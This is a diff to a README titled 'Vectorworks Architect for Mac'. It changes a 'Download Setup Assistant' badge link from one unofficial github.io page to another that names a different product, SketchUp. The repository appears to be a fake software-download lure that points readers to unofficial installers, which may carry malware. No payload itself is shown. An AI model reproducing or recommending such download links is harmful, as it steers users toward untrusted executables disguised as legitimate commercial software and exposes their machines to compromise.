@@ -1,6 +1,6 @@
 # Vectorworks Architect for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vectorworks-architect-download-mac.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://sketchup-download-mac.github.io/.github)
 
 ## 📦 How to Install
 
